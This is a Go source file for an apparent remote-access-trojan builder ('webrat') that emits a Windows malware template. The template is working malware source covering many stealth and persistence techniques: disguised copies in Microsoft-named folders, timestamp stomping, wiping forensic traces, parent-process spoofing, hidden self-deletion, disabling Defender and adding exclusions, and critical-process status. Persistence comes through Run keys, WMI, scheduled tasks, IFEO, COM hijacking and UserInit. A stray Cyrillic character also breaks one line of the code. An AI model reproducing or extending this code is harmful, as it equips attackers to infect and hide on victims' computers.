package buildergen

import "strings"

func templateProcess() string {
	return strings.TrimSpace(`
const stillActive uint32 = 259

type webratService struct{}Я

func isProcessRunning(pid int) bool {
	if pid <= 0 {
		return false
	}
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
	if err != nil {
		return false
	}
	defer windows.CloseHandle(h)
	var code uint32
	if err := windows.GetExitCodeProcess(h, &code); err != nil {
		return false
	}
	return code == stillActive
}

func (s *webratService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	const accepted = svc.AcceptStop | svc.AcceptShutdown
	changes <- svc.Status{State: svc.StartPending}

	workerPath := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName(), getWorkerExeName())

	servicePid := os.Getpid()
	workerPid := 0
	startWorker := func() int {
		cmd := exec.Command(workerPath, "worker", strconv.Itoa(servicePid))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err != nil {
			return 0
		}
		return cmd.Process.Pid
	}

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(workerPid) {
				workerPid = startWorker()
			}
		}
	}()

	changes <- svc.Status{State: svc.Running, Accepts: accepted}

	for {
		select {
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}
				return false, 0
			}
		}
	}
}

func touchTimestamps(targetPath string) {
	refPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "notepad.exe")
	info, err := os.Stat(refPath)
	if err != nil {
		return
	}
	_ = os.Chtimes(targetPath, info.ModTime(), info.ModTime())
}

func getDisguiseCandidates() []string {
	return []string{
		"SystemAppData",
		"CloudStore",
		"IdentityService",
		"DeviceMetadataStore",
	}
}

func tryDisguiseCopy(exePath string) (string, bool) {
	localApp := os.Getenv(getLocalAppDataEnv())
	msDir := getMicrosoftDirName()
	exeName := getDisguisedExeName()

	dirs := getDisguiseCandidates()
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(dirs), func(i, j int) { dirs[i], dirs[j] = dirs[j], dirs[i] })

	for _, d := range dirs {
		dir := filepath.Join(localApp, msDir, d)
		target := filepath.Join(dir, exeName)

		if err := os.MkdirAll(dir, 0755); err != nil {
			continue
		}
		if err := copyFile(exePath, target); err != nil {
			continue
		}
		if _, err := os.Stat(target); err != nil {
			continue
		}

		touchTimestamps(target)
		removeZoneIdentifier(target)

		if hideFilesEnabled {
			_ = windows.SetFileAttributes(windows.StringToUTF16Ptr(dir), uint32(windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM))
		}

		return target, true
	}

	return exePath, false
}

func runPrimaryWithWorker() {
	applyStealthMeasures()

	exePath, err := os.Executable()
	if err != nil {
		loopA()
		return
	}

	removeZoneIdentifier(exePath)
	go clearRecentItems()
	go cleanShellBags()
	go cleanMUICache()

	disguisedPath, copied := tryDisguiseCopy(exePath)

	opSetupTask(disguisedPath)

	exeNorm, _ := filepath.Abs(exePath)
	disguisedNorm, _ := filepath.Abs(disguisedPath)

	if copied && !strings.EqualFold(exeNorm, disguisedNorm) {
		if err := spawnWithSpoofedParent(disguisedPath, []string{"worker"}); err == nil {
			selfDeleteOriginal(exeNorm)
			return
		}
	}

	loopA()
}

func selfDeleteOriginal(exePath string) {
	if strings.TrimSpace(exePath) == "" {
		return
	}
	escaped := strings.ReplaceAll(exePath, "'", "''")
	psCmd := fmt.Sprintf("Start-Sleep -Seconds 2; Remove-Item -Force '%s' -ErrorAction SilentlyContinue", escaped)
	cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCmd)
	_ = cmd.Start()
}

func runWorkerGuard() {
	applyStealthMeasures()
	go performAntiForensicsNormal()

	startWatchdogMonitor()

	go func() {
		for {
			time.Sleep(time.Duration(180+rand.Intn(120)) * time.Second)
			healPersistenceLight()
		}
	}()

	go func() {
		for {
			time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
			clearRecentItems()
			cleanShellBags()
			cleanMUICache()
			exePath, err := os.Executable()
			if err == nil {
				removeZoneIdentifier(exePath)
				stampFileToSystem(exePath)
			}
		}
	}()

	loopA()
}

func runWorkerGuardAggressive() {
	go performAntiForensicsAggressive()
	go setCriticalProcess()

	go func() {
		for {
			time.Sleep(time.Duration(240+rand.Intn(120)) * time.Second)
			healPersistenceAggressive()
		}
	}()

	go func() {
		time.Sleep(30 * time.Minute)
		for {
			disableDefenderFull()
			time.Sleep(6 * time.Hour)
		}
	}()

	loopA()
}

func healPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	workerDir := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())
	expectedWorker := filepath.Join(workerDir, getWorkerExeName())
	if _, err := os.Stat(expectedWorker); err != nil {
		_ = os.MkdirAll(workerDir, 0755)
		_ = copyFile(exePath, expectedWorker)
		touchTimestamps(expectedWorker)
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regQueryValueEx := advapi32.NewProc("RegQueryValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
	keyPath, _ := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret == 0 {
		valName, _ := syscall.UTF16PtrFromString(getDisplayName())
		var vType uint32
		var dataSize uint32
		r2, _, _ := regQueryValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&vType)), 0, uintptr(unsafe.Pointer(&dataSize)))
		regCloseKey.Call(uintptr(hKey))
		if r2 != 0 {
			opAddRegistryRun(expectedWorker)
		}
	} else {
		opAddRegistryRun(expectedWorker)
	}

	startupDir := filepath.Join(os.Getenv(getAppDataEnvName()), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lnkPath := filepath.Join(startupDir, getDisplayName()+".lnk")
	if _, err := os.Stat(lnkPath); err != nil {
		opAddStartupShortcut(expectedWorker)
	}

	if !isWmiPersistencePresent() {
		opAddWmiPersistence(expectedWorker)
	}
}

func healPersistenceAggressive() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	workerDir := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())
	expectedWorker := filepath.Join(workerDir, getWorkerExeName())
	if _, err := os.Stat(expectedWorker); err != nil {
		_ = os.MkdirAll(workerDir, 0755)
		_ = copyFile(exePath, expectedWorker)
		touchTimestamps(expectedWorker)
	}

	serviceDir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
	expectedService := filepath.Join(serviceDir, getServiceExeName())
	if _, err := os.Stat(expectedService); err != nil {
		_ = os.MkdirAll(serviceDir, 0755)
		_ = copyFile(exePath, expectedService)
		touchTimestamps(expectedService)
	}

	_ = opStartSvc(getServiceName())

	addSelfToExclusions(expectedService)
	addSelfToExclusions(expectedWorker)

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regQueryValueEx := advapi32.NewProc("RegQueryValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())

	keyPath, _ := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret == 0 {
		valName, _ := syscall.UTF16PtrFromString(getDisplayName())
		var vType uint32
		var dataSize uint32
		r2, _, _ := regQueryValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&vType)), 0, uintptr(unsafe.Pointer(&dataSize)))
		regCloseKey.Call(uintptr(hKey))
		if r2 != 0 {
			opAddRegistryRun(expectedWorker)
		}
	} else {
		opAddRegistryRun(expectedWorker)
	}

	startupDir := filepath.Join(os.Getenv(getAppDataEnvName()), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lnkPath := filepath.Join(startupDir, getDisplayName()+".lnk")
	if _, err := os.Stat(lnkPath); err != nil {
		opAddStartupShortcut(expectedWorker)
	}

	if !isWmiPersistencePresent() {
		opAddWmiPersistence(expectedWorker)
	}

	if !isHKLMRunPresent() {
		addHKLMRun(expectedWorker)
	}

	addBootPersistence(expectedWorker)

	if !isIFEOPresent() {
		setupIFEO(expectedWorker)
	}

	ruleName := getDisplayName() + " Service"
	if !isFirewallRulePresent(ruleName) {
		setupFirewallRules(expectedService)
		if expectedService != expectedWorker {
			setupFirewallRules(expectedWorker)
		}
	}

	go protectFileWithACL(expectedService)
	go protectFileWithACL(expectedWorker)
}

func healPersistenceLight() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	localApp := os.Getenv(getLocalAppDataEnv())
	msDir := getMicrosoftDirName()
	exeName := getDisguisedExeName()

	dirs := getDisguiseCandidates()
	var workerPath string
	for _, d := range dirs {
		candidate := filepath.Join(localApp, msDir, d, exeName)
		if _, err := os.Stat(candidate); err == nil {
			workerPath = candidate
			break
		}
	}

	if workerPath == "" {
		_, copied := tryDisguiseCopy(exePath)
		if copied {
			localApp = os.Getenv(getLocalAppDataEnv())
			for _, d := range dirs {
				candidate := filepath.Join(localApp, msDir, d, exeName)
				if _, err := os.Stat(candidate); err == nil {
					workerPath = candidate
					break
				}
			}
		}
		if workerPath == "" {
			workerPath = exePath
		}
	}

	removeZoneIdentifier(workerPath)
	touchTimestamps(workerPath)

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regQueryValueEx := advapi32.NewProc("RegQueryValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
	keyPath, _ := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
	var hKey syscall.Handle
	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
	if ret == 0 {
		valName, _ := syscall.UTF16PtrFromString(getDisplayName())
		var vType uint32
		var dataSize uint32
		r2, _, _ := regQueryValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&vType)), 0, uintptr(unsafe.Pointer(&dataSize)))
		regCloseKey.Call(uintptr(hKey))
		if r2 != 0 {
			opAddRegistryRun(workerPath)
		}
	} else {
		opAddRegistryRun(workerPath)
	}

	startupDir := filepath.Join(os.Getenv(getAppDataEnvName()), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lnkPath := filepath.Join(startupDir, getDisplayName()+".lnk")
	if _, err := os.Stat(lnkPath); err != nil {
		opAddStartupShortcut(workerPath)
	}

	if !isWmiPersistencePresent() {
		opAddWmiPersistence(workerPath)
	}

	if !isTaskPresent(getTaskName()) {
		opSetupTask(workerPath)
	}

	if !isCOMHijackPresent() {
		addCOMHijack(workerPath)
	}

	if !isUserInitScriptPresent() {
		addUserInitScript(workerPath)
	}
}
`)
}
